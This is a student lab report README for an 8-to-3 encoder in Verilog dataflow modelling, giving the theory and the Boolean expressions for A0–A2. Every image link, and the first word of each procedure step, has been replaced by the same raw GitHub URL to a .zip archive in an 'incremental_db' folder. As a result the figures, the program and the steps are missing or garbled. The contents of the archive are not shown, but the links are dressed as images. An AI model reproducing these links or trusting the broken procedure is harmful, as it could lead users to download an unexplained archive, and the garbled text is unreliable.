### ENCODER 8TO3 DATAFLOW Modelling

**AIM:**

To implement  Encoder 8 To 3 in Dataflow Modelling using verilog and validating their functionality using their functional tables

**SOFTWARE REQUIRED:** Quartus prime

**THEORY**

**Encoder 8 To 3**

The 8 to 3 line Encoder is also known as Octal to Binary Encoder. In 8 to 3 line encoder, there is a total of eight inputs, i.e., D0, D1, D2, D3, D4, D5, D6, and D7 and three outputs, i.e., A0, A1, and A2. In 8-input lines, one input-line is set to true at a time to get the respective binary code in the output side. Below are the block diagram and the truth table of the 8 to 3 line encoder.

![image](https://raw.githubusercontent.com/Yugabharathi91/ENCODER8TO3DATAFLOW/main/incremental_db/DATAFLOW-T-ENCODE-1.0.zip)

Figure 01  Block Diagram of Encoder 8 * 3

**Truth Table**

![image](https://raw.githubusercontent.com/Yugabharathi91/ENCODER8TO3DATAFLOW/main/incremental_db/DATAFLOW-T-ENCODE-1.0.zip)

The logical expression of the term A0, A1, and A2 are as follows:

A0 = D1 + D3 + D5 + D7

A1 = D2 + D3 + D6 + D7

A2 = D4 + D5 + D6 + D7

Logical circuit of the above expressions is given below:

![image](https://raw.githubusercontent.com/Yugabharathi91/ENCODER8TO3DATAFLOW/main/incremental_db/DATAFLOW-T-ENCODE-1.0.zip)

Figure 02  Encoder 8 * 3

**Procedure**


https://raw.githubusercontent.com/Yugabharathi91/ENCODER8TO3DATAFLOW/main/incremental_db/DATAFLOW-T-ENCODE-1.0.zip the program in Quartus software.


https://raw.githubusercontent.com/Yugabharathi91/ENCODER8TO3DATAFLOW/main/incremental_db/DATAFLOW-T-ENCODE-1.0.zip and run the program.


https://raw.githubusercontent.com/Yugabharathi91/ENCODER8TO3DATAFLOW/main/incremental_db/DATAFLOW-T-ENCODE-1.0.zip the RTL schematic and save the logic diagram.


https://raw.githubusercontent.com/Yugabharathi91/ENCODER8TO3DATAFLOW/main/incremental_db/DATAFLOW-T-ENCODE-1.0.zip nodes for inputs and outputs to generate the timing diagram.


https://raw.githubusercontent.com/Yugabharathi91/ENCODER8TO3DATAFLOW/main/incremental_db/DATAFLOW-T-ENCODE-1.0.zip different input combinations generate the timing diagram.


**PROGRAM**
```
Program for Encoder 8 To 3 in Dataflow Modelling and verify its truth table in quartus using Verilog programming. 
Developed by: YUGABHARATHI M
RegisterNumber:212224230314
```
![exp 5 program update](https://raw.githubusercontent.com/Yugabharathi91/ENCODER8TO3DATAFLOW/main/incremental_db/DATAFLOW-T-ENCODE-1.0.zip)


**RTL LOGIC FOR Encoder 8 To 3 in Dataflow Modelling**
![exp 5 rtl logic](https://raw.githubusercontent.com/Yugabharathi91/ENCODER8TO3DATAFLOW/main/incremental_db/DATAFLOW-T-ENCODE-1.0.zip)


**TIMING DIGRAMS FOR Encoder 8 To 3 in Dataflow Modelling**
![exp 5 tt](https://raw.githubusercontent.com/Yugabharathi91/ENCODER8TO3DATAFLOW/main/incremental_db/DATAFLOW-T-ENCODE-1.0.zip)


**RESULTS**

implementing Encoder 8 To 3 in Dataflow Modelling using verilog and validating their functionality using their functional tables executed succesfully.



